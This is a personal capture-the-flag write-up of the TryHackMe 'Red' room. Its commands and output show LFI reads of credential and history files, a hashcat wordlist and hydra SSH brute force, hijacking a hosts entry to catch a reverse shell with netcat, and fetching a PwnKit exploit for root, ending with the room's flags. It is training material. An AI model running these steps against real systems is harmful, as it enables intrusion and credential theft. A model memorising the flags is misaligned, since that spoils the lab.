---
creation date: July 14th 2023
last modified date: July 14th 2023
aliases: []
tags: #🎌
---

Primary Categories: 
Secondary Categories:  
Links: 
Search Tag: #🎌  

# [[THM - Red]]  


# Resolution summary
- Was a harder "easy" challenge but ultimately was simple just had a good mix of techniques. From enumeration methods to locating vulnerable applications. 

## Improved skills
- skill 1
- skill 2

## Used tools
- [[nmap]]
- [[Hydra]]

---

# Information Gathering
Scanned all TCP ports:
```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Enumerated open TCP ports:
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:74:1c:e0:f7:86:4d:69:46:f6:5b:4d:be:c3:9f:76 (RSA)
|   256 fb:84:73:da:6c:fe:b9:19:5a:6c:65:4d:d1:72:3b:b0 (ECDSA)
|_  256 5e:37:75:fc:b3:64:e2:d8:d6:bc:9a:e6:7e:60:4d:3c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 80

Enumerated `http://RHOST/FUZZ`:
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.231.215/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 182ms]
    * FUZZ: assets

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 186ms]
    * FUZZ: 

[Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 207ms]
    * FUZZ: server-status

:: Progress: [207629/207629] :: Job [1/1] :: 216 req/sec :: Duration: [0:16:15] :: Errors: 0 ::
```

Enumerated `http://$RHOST/FUZZ.html`
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.231.215/FUZZ.html
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 9309, Words: 694, Lines: 190, Duration: 190ms]
    * FUZZ: about

[Status: 200, Size: 15757, Words: 2933, Lines: 348, Duration: 190ms]
    * FUZZ: home

[Status: 200, Size: 9131, Words: 1066, Lines: 187, Duration: 183ms]
    * FUZZ: services
[Status: 200, Size: 7283, Words: 419, Lines: 213, Duration: 185ms]
    * FUZZ: signup

[Status: 200, Size: 7507, Words: 439, Lines: 218, Duration: 2926ms]
    * FUZZ: contact

[Status: 200, Size: 14352, Words: 4971, Lines: 307, Duration: 185ms]
    * FUZZ: portfolio

[Status: 200, Size: 6655, Words: 375, Lines: 195, Duration: 183ms]
    * FUZZ: signin

[Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 186ms]
    * FUZZ: 

:: Progress: [207629/207629] :: Job [1/1] :: 219 req/sec :: Duration: [0:16:12] :: Errors: 0 ::
```
- Located hidden directory `http://$RHOST/signin.html`
	- Contains a register page which I tried to create an account but was not able to sign in after?
		- testtest@hbci.com:password
	- SPENT ALONG TIME HERE AND IT SEEMS THE PAGE GOES NO WHERE AND SENDS ALL ITS INFO NO WHERE!!!







---

# Exploitation
## [[LFI|Local File Inclusion]]
#### The following are executed here http://10.10.16.56/index.php?page=php://filter/resource=
- /etc/passwd
```bash
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin 
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin 
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin 
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin 
syslog:x:104:110::/home/syslog:/usr/sbin/nologin 
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin 
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false 
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin 
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin 
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin 
pollinate:x:110:1::/var/cache/pollinate:/bin/false 
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin 
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin 
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin 
blue:x:1000:1000:blue:/home/blue:/bin/bash 
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false 
red:x:1001:1001::/home/red:/bin/bash
```

- /etc/issue
```bash
Ubuntu 20.04.4 LTS \n \l
```

- /etc/group
```bash
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog
tty:x:5:syslog
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:
audio:x:29:
dip:x:30:
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-network:x:102:
systemd-resolve:x:103:
systemd-timesync:x:104:
crontab:x:105:
messagebus:x:106:
input:x:107:
kvm:x:108:
render:x:109:
syslog:x:110:
tss:x:111:
uuidd:x:112:
tcpdump:x:113:
ssh:x:114:
landscape:x:115:
lxd:x:116:
systemd-coredump:x:999:
blue:x:1000:
red:x:1001:
ssl-cert:x:117:
```

- /home/blue/.bash_history
```bash
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```

- /home/blue/.reminder
```bash
sup3r_p@s$w0rd!
```


## SSH Bruteforce
1. Located with LFI the bash history for user *blue*
2. First create a file named *.reminder* on our system and fill it with the password we found under */home/blue/.reminder*
	- `sup3r_p@s$w0rd!`
3. According to the history the following command was run in order to generate a *passlist.txt*:
```bash
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
```
4. Now we attack ssh with the new list:
```bash
hydra -l blue -P ./passlist.txt ssh://10.10.16.56
```
- *blue:!dr0w$s@p_r3pus*
	- This password is always changing to another from the list need to run hydra each time to check it  when logging in or FORCED out dammit

---

# Lateral Movement to user
## Local Enumeration


## Lateral Movement vector


---

# Privilege Escalation
## Local Enumeration


## Privilege Escalation vector


---

# Recreation Steps
1. Utilize LFI found at `http://<ATTACK_IP>/index.php?page=php://filter/resource=/etc/passwd`
	- Gives us a list of all users two to note *red* & *blue*
2. Investigate both users by going to: `http://<ATTACK_IP>/index.php?page=php://filter/resource=/home/<USER>/.bash_history`
	- *red* is blank
	- *blue* contains needed steps to get the password list for this user
3. Blues command history indicates that it access another file so lets grab that quick: `http://ATTACK_IP/index.php?page=php://filter/resource=/home/blue/.reminder`
	- Contains what was the blue users password
	- Save this to our machine by copy pasting it to a file names `.reminder`
4. Next blues bash history shows they ran a [[Hashcat]] command which we will replicate run the following on our machine: `hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt`
	- This will generate out password list we will need to use to access the *blue* user
5. Bruteforce SSH against user blue using our newly created *passlist.txt*: `hydra -l blue -P ./passlist.txt ssh://<ATTACK_IP>`
6. As *blue* user on SSH run: `echo "<LOCAL_IP> redrules.thm" >> /etc/hosts`
	- This will append our IP to the hosts file because there is a bash command that keeps running calling a shell at that domain
	- The system as a defense will overwrite the hosts file so we might need to do this a few times while waiting for the shell to open 
7. Start a listener on our machine for *port 9001*: `nc -lvnp 9001`
	- Now we wait until we get a shell as the user *red*
8. As *red* user we need to stabilize the shell as this shell right now is non-interactive.
9. Once stable download the following on our local machine: `wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py`
10. Edit this python script and change the ending of it *line 110* to:
![[Pasted image 20230715190306.png]]
- We are telling the script that we want to use the [[Pkexec]] file under the .git directory as it has the *setid* that will allow us to run this command as root
11. Run a python server on our machine to transfer the file over to the victim: `python -m http.server 3000`
12. On the victim now navigate to the */tmp* directory and download our python script
13. Run the script through python and we should have *root*
14. Flag grabbing now:
	1. /home/blue/flag1
	2. /home/red/flag2
	3. /root/flag3

---

# Trophy & Loot
flag1: THM{Is_thAt_all_y0u_can_d0_blU3?}

flag2: THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}

flag3: THM{Go0d_Gam3_Blu3_GG}

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: July 14th 2023 (07:07 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
